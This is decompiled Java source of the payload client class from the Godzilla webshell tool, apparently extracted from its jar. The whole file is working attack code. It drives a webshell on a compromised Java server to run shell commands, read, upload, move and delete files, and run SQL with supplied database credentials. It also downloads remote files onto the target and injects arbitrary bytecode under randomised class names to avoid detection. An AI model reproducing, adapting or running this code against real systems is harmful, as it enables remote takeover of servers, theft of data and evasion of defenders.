/*     */ package shells.payloads.java;
/*     */ 
/*     */ import core.EasyI18N;
/*     */ import core.Encoding;
/*     */ import core.annotation.PayloadAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.shell.ShellEntity;
/*     */ import java.io.ByteArrayInputStream;
/*     */ import java.io.InputStream;
/*     */ import java.util.HashMap;
/*     */ import java.util.HashSet;
/*     */ import java.util.Map;
/*     */ import javassist.ClassPool;
/*     */ import javassist.CtClass;
/*     */ import util.Log;
/*     */ import util.functions;
/*     */ import util.http.Http;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ @PayloadAnnotation(Name = "JavaDynamicPayload")
/*     */ public class JavaShell
/*     */   implements Payload {
/*     */   private static final String BASICINFO_REGEX = "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory) : (.+)";
/*  24 */   private static final String[] ALL_DATABASE_TYPE = new String[] { "mysql", "oracle", "sqlserver", "postgresql", "sqlite" };
/*     */   private ShellEntity shell;
/*     */   private Http http;
/*     */   private Encoding encoding;
/*     */   private String fileRoot;
/*     */   private String currentDir;
/*     */   private String currentUser;
/*     */   private String osInfo;
/*     */   private String basicsInfo;
/*     */   private String processArch;
/*     */   private String tempDirectory;
/*  35 */   private HashSet dynamicClassNameSet = null;
/*  36 */   private HashMap<String, String> dynamicClassNameHashMap = null;
/*     */   private boolean isAlive;
/*     */   
/*     */   public JavaShell() {
/*  40 */     this.dynamicClassNameSet = DynamicUpdateClass.getAllDynamicClassName();
/*  41 */     this.dynamicClassNameHashMap = new HashMap<>();
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellContext) {
/*  47 */     this.shell = shellContext;
/*  48 */     this.http = this.shell.getHttp();
/*  49 */     this.encoding = Encoding.getEncoding(this.shell);
/*     */   }
/*     */   public String getClassName(String protoName) {
/*  52 */     return this.dynamicClassNameHashMap.get(protoName);
/*     */   }
/*     */   public synchronized String randomName() {
/*  55 */     String[] classNames = (String[])this.dynamicClassNameSet.toArray((Object[])new String[0]);
/*  56 */     String className = null;
/*  57 */     if (classNames.length > 0) {
/*  58 */       int index = functions.randomInt(0, classNames.length);
/*  59 */       className = classNames[index];
/*  60 */       this.dynamicClassNameSet.remove(className);
/*     */     } 
/*  62 */     return className;
/*     */   }
/*     */   public byte[] dynamicUpdateClassName(String protoName, byte[] classContent) {
/*     */     try {
/*  66 */       CtClass ctClass = ClassPool.getDefault().makeClass(new ByteArrayInputStream(classContent));
/*  67 */       String className = randomName();
/*  68 */       ctClass.setName(className);
/*  69 */       this.dynamicClassNameHashMap.put(protoName, className);
/*  70 */       Log.log("%s ----->>>>> %s", new Object[] { protoName, className });
/*  71 */       classContent = ctClass.toBytecode();
/*  72 */       ctClass.detach();
/*  73 */       return classContent;
/*  74 */     } catch (Exception e) {
/*  75 */       Log.error(e);
/*     */       
/*  77 */       this.dynamicClassNameHashMap.put(protoName, protoName);
/*  78 */       return classContent;
/*     */     } 
/*     */   }
/*     */   
/*     */   public String getFile(String filePath) {
/*  83 */     ReqParameter parameters = new ReqParameter();
/*  84 */     parameters.add("dirName", this.encoding.Encoding((filePath.length() > 0) ? filePath : " "));
/*  85 */     return this.encoding.Decoding(evalFunc(null, "getFile", parameters));
/*     */   }
/*     */ 
/*     */   
/*     */   public byte[] downloadFile(String fileName) {
/*  90 */     ReqParameter parameter = new ReqParameter();
/*  91 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/*  92 */     byte[] result = evalFunc(null, "readFile", parameter);
/*  93 */     return result;
/*     */   }
/*     */ 
/*     */   
/*     */   public String getBasicsInfo() {
/*  98 */     if (this.basicsInfo == null) {
/*  99 */       ReqParameter parameter = new ReqParameter();
/* 100 */       this.basicsInfo = this.encoding.Decoding(evalFunc(null, "getBasicsInfo", parameter));
/*     */     } 
/* 102 */     Map<String, String> pxMap = functions.matcherTwoChild(this.basicsInfo, "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory) : (.+)");
/* 103 */     this.fileRoot = pxMap.get("FileRoot");
/* 104 */     this.currentDir = pxMap.get("CurrentDir");
/* 105 */     this.currentUser = pxMap.get("CurrentUser");
/* 106 */     this.osInfo = pxMap.get("OsInfo");
/* 107 */     this.processArch = pxMap.get("ProcessArch");
/* 108 */     this.tempDirectory = pxMap.get("TempDirectory");
/* 109 */     return this.basicsInfo;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean include(String codeName, byte[] binCode) {
/* 114 */     ReqParameter parameters = new ReqParameter();
/* 115 */     binCode = dynamicUpdateClassName(codeName, binCode);
/* 116 */     codeName = this.dynamicClassNameHashMap.get(codeName);
/* 117 */     if (codeName != null) {
/* 118 */       parameters.add("codeName", codeName);
/* 119 */       parameters.add("binCode", binCode);
/* 120 */       byte[] result = evalFunc(null, "include", parameters);
/* 121 */       String resultString = (new String(result)).trim();
/* 122 */       if (resultString.equals("ok")) {
/* 123 */         return true;
/*     */       }
/* 125 */       Log.error(resultString);
/* 126 */       return false;
/*     */     } 
/*     */     
/* 129 */     Log.error(String.format(EasyI18N.getI18nString("类: %s 映射不存在"), new Object[] { codeName }));
/*     */     
/* 131 */     return false;
/*     */   }
/*     */ 
/*     */   
/*     */   public void fillParameter(String className, String funcName, ReqParameter parameter) {
/* 136 */     if (className != null && className.trim().length() > 0) {
/* 137 */       parameter.add("evalClassName", getClassName(className));
/*     */     }
/* 139 */     parameter.add("methodName", funcName);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] evalFunc(String className, String funcName, ReqParameter parameter) {
/* 145 */     fillParameter(className, funcName, parameter);
/* 146 */     byte[] data = parameter.formatEx();
/*     */     
/* 148 */     data = functions.gzipE(data);
/*     */ 
/*     */     
/* 151 */     return functions.gzipD(this.http.sendHttpResponse(data).getResult());
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean uploadFile(String fileName, byte[] data) {
/* 157 */     ReqParameter parameter = new ReqParameter();
/* 158 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/* 159 */     parameter.add("fileValue", data);
/* 160 */     byte[] result = evalFunc(null, "uploadFile", parameter);
/* 161 */     String stateString = this.encoding.Decoding(result);
/* 162 */     if ("ok".equals(stateString)) {
/* 163 */       return true;
/*     */     }
/* 165 */     Log.error(stateString);
/* 166 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean copyFile(String fileName, String newFile) {
/* 172 */     ReqParameter parameter = new ReqParameter();
/* 173 */     parameter.add("srcFileName", this.encoding.Encoding(fileName));
/* 174 */     parameter.add("destFileName", this.encoding.Encoding(newFile));
/* 175 */     byte[] result = evalFunc(null, "copyFile", parameter);
/* 176 */     String stateString = this.encoding.Decoding(result);
/* 177 */     if ("ok".equals(stateString)) {
/* 178 */       return true;
/*     */     }
/* 180 */     Log.error(stateString);
/* 181 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean deleteFile(String fileName) {
/* 187 */     ReqParameter parameter = new ReqParameter();
/* 188 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/* 189 */     byte[] result = evalFunc(null, "deleteFile", parameter);
/* 190 */     String stateString = this.encoding.Decoding(result);
/* 191 */     if ("ok".equals(stateString)) {
/* 192 */       return true;
/*     */     }
/* 194 */     Log.error(stateString);
/* 195 */     return false;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean newFile(String fileName) {
/* 200 */     ReqParameter parameter = new ReqParameter();
/* 201 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/* 202 */     byte[] result = evalFunc(null, "newFile", parameter);
/* 203 */     String stateString = this.encoding.Decoding(result);
/* 204 */     if ("ok".equals(stateString)) {
/* 205 */       return true;
/*     */     }
/* 207 */     Log.error(stateString);
/* 208 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean newDir(String fileName) {
/* 214 */     ReqParameter parameter = new ReqParameter();
/* 215 */     parameter.add("dirName", this.encoding.Encoding(fileName));
/* 216 */     byte[] result = evalFunc(null, "newDir", parameter);
/* 217 */     String stateString = this.encoding.Decoding(result);
/* 218 */     if ("ok".equals(stateString)) {
/* 219 */       return true;
/*     */     }
/* 221 */     Log.error(stateString);
/* 222 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public String execSql(String dbType, String dbHost, int dbPort, String dbUsername, String dbPassword, String execType, Map options, String execSql) {
/* 229 */     ReqParameter parameter = new ReqParameter();
/* 230 */     parameter.add("dbType", dbType);
/* 231 */     parameter.add("dbHost", dbHost);
/* 232 */     parameter.add("dbPort", Integer.toString(dbPort));
/* 233 */     parameter.add("dbUsername", dbUsername);
/* 234 */     parameter.add("dbPassword", dbPassword);
/* 235 */     parameter.add("execType", execType);
/* 236 */     parameter.add("execSql", this.shell.getDbEncodingModule().Encoding(execSql));
/* 237 */     if (options != null) {
/* 238 */       String dbCharset = (String)options.get("dbCharset");
/* 239 */       String currentDb = (String)options.get("currentDb");
/* 240 */       if (dbCharset != null) {
/* 241 */         parameter.add("dbCharset", dbCharset);
/* 242 */         parameter.add("execSql", Encoding.getEncoding(dbCharset).Encoding(execSql));
/*     */       } 
/* 244 */       if (currentDb != null) {
/* 245 */         parameter.add("currentDb", currentDb);
/*     */       }
/*     */     } 
/* 248 */     byte[] result = evalFunc(null, "execSql", parameter);
/* 249 */     return this.encoding.Decoding(result);
/*     */   }
/*     */ 
/*     */   
/*     */   public String currentDir() {
/* 254 */     if (this.currentDir != null) {
/* 255 */       return functions.formatDir(this.currentDir);
/*     */     }
/* 257 */     getBasicsInfo();
/* 258 */     return functions.formatDir(this.currentDir);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean test() {
/* 264 */     ReqParameter parameter = new ReqParameter();
/* 265 */     byte[] result = evalFunc(null, "test", parameter);
/* 266 */     String codeString = new String(result);
/* 267 */     if (codeString.trim().equals("ok")) {
/* 268 */       this.isAlive = true;
/* 269 */       return true;
/*     */     } 
/* 271 */     Log.error(codeString);
/* 272 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String currentUserName() {
/* 278 */     if (this.currentUser != null) {
/* 279 */       return this.currentUser;
/*     */     }
/* 281 */     getBasicsInfo();
/* 282 */     return this.currentUser;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String bigFileUpload(String fileName, int position, byte[] content) {
/* 288 */     ReqParameter reqParameter = new ReqParameter();
/* 289 */     reqParameter.add("fileContents", content);
/* 290 */     reqParameter.add("fileName", this.encoding.Encoding(fileName));
/* 291 */     reqParameter.add("position", String.valueOf(position));
/* 292 */     byte[] result = evalFunc(null, "bigFileUpload", reqParameter);
/* 293 */     return this.encoding.Decoding(result);
/*     */   }
/*     */ 
/*     */   
/*     */   public String getTempDirectory() {
/* 298 */     if (this.tempDirectory != null) {
/* 299 */       return this.tempDirectory;
/*     */     }
/* 301 */     if (isWindows()) {
/* 302 */       return "c:/windows/temp/";
/*     */     }
/* 304 */     return "/tmp/";
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] bigFileDownload(String fileName, int position, int readByteNum) {
/* 311 */     ReqParameter reqParameter = new ReqParameter();
/* 312 */     reqParameter.add("position", String.valueOf(position));
/* 313 */     reqParameter.add("readByteNum", String.valueOf(readByteNum));
/* 314 */     reqParameter.add("fileName", this.encoding.Encoding(fileName));
/* 315 */     reqParameter.add("mode", "read");
/* 316 */     return evalFunc(null, "bigFileDownload", reqParameter);
/*     */   }
/*     */ 
/*     */   
/*     */   public int getFileSize(String fileName) {
/* 321 */     ReqParameter reqParameter = new ReqParameter();
/* 322 */     reqParameter.add("fileName", this.encoding.Encoding(fileName));
/* 323 */     reqParameter.add("mode", "fileSize");
/* 324 */     byte[] result = evalFunc(null, "bigFileDownload", reqParameter);
/* 325 */     String ret = this.encoding.Decoding(result);
/*     */     try {
/* 327 */       return Integer.parseInt(ret);
/* 328 */     } catch (Exception e) {
/* 329 */       Log.error(e);
/* 330 */       Log.error(ret);
/*     */       
/* 332 */       return -1;
/*     */     } 
/*     */   }
/*     */   
/*     */   public boolean isWindows() {
/* 337 */     return (currentDir().charAt(0) != '/');
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean isAlive() {
/* 342 */     return this.isAlive;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean isX64() {
/* 347 */     return this.processArch.contains("64");
/*     */   }
/*     */ 
/*     */   
/*     */   public String[] listFileRoot() {
/* 352 */     if (this.fileRoot != null) {
/* 353 */       return this.fileRoot.split(";");
/*     */     }
/* 355 */     getBasicsInfo();
/* 356 */     return this.fileRoot.split(";");
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String execCommand(String commandStr) {
/* 362 */     ReqParameter parameter = new ReqParameter();
/* 363 */     parameter.add("cmdLine", this.encoding.Encoding(commandStr));
/*     */     
/* 365 */     String[] commandArgs = functions.SplitArgs(commandStr);
/* 366 */     for (int i = 0; i < commandArgs.length; i++) {
/* 367 */       parameter.add(String.format("arg-%d", new Object[] { Integer.valueOf(i) }), this.encoding.Encoding(commandArgs[i]));
/*     */     } 
/* 369 */     parameter.add("argsCount", String.valueOf(commandArgs.length));
/*     */     
/* 371 */     String[] executableArgs = functions.SplitArgs(commandStr, 1, false);
/*     */     
/* 373 */     if (executableArgs.length > 0) {
/* 374 */       parameter.add("executableFile", executableArgs[0]);
/* 375 */       if (executableArgs.length >= 2) {
/* 376 */         parameter.add("executableArgs", executableArgs[1]);
/*     */       }
/*     */     } 
/*     */     
/* 380 */     byte[] result = evalFunc(null, "execCommand", parameter);
/* 381 */     return this.encoding.Decoding(result);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String getOsInfo() {
/* 387 */     if (this.osInfo != null) {
/* 388 */       return this.osInfo;
/*     */     }
/* 390 */     getBasicsInfo();
/* 391 */     return this.osInfo;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public String[] getAllDatabaseType() {
/* 398 */     return ALL_DATABASE_TYPE;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean moveFile(String fileName, String newFile) {
/* 403 */     ReqParameter parameter = new ReqParameter();
/* 404 */     parameter.add("srcFileName", this.encoding.Encoding(fileName));
/* 405 */     parameter.add("destFileName", this.encoding.Encoding(newFile));
/* 406 */     byte[] result = evalFunc(null, "moveFile", parameter);
/* 407 */     String stasteString = this.encoding.Decoding(result);
/* 408 */     if ("ok".equals(stasteString)) {
/* 409 */       return true;
/*     */     }
/* 411 */     Log.error(stasteString);
/* 412 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] getPayload() {
/* 419 */     byte[] data = null;
/*     */     try {
/* 421 */       InputStream fileInputStream = JavaShell.class.getResourceAsStream("assets/payload.classs");
/* 422 */       data = functions.readInputStream(fileInputStream);
/* 423 */       fileInputStream.close();
/* 424 */     } catch (Exception e) {
/* 425 */       Log.error(e);
/*     */     } 
/* 427 */     return dynamicUpdateClassName("payload", data);
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean fileRemoteDown(String url, String saveFile) {
/* 432 */     ReqParameter reqParameter = new ReqParameter();
/* 433 */     reqParameter.add("url", this.encoding.Encoding(url));
/* 434 */     reqParameter.add("saveFile", this.encoding.Encoding(saveFile));
/* 435 */     String result = this.encoding.Decoding(evalFunc(null, "fileRemoteDown", reqParameter));
/* 436 */     if ("ok".equals(result)) {
/* 437 */       return true;
/*     */     }
/* 439 */     Log.error(result);
/* 440 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean setFileAttr(String file, String type, String fileAttr) {
/* 446 */     ReqParameter reqParameter = new ReqParameter();
/* 447 */     reqParameter.add("type", type);
/* 448 */     reqParameter.add("fileName", this.encoding.Encoding(file));
/* 449 */     reqParameter.add("attr", fileAttr);
/* 450 */     String result = this.encoding.Decoding(evalFunc(null, "setFileAttr", reqParameter));
/* 451 */     if ("ok".equals(result)) {
/* 452 */       return true;
/*     */     }
/* 454 */     Log.error(result);
/* 455 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean close() {
/* 461 */     this.isAlive = false;
/* 462 */     ReqParameter reqParameter = new ReqParameter();
/* 463 */     String result = this.encoding.Decoding(evalFunc(null, "close", reqParameter));
/* 464 */     if ("ok".equals(result)) {
/* 465 */       return true;
/*     */     }
/* 467 */     Log.error(result);
/* 468 */     return false;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\payloads\java\JavaShell.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */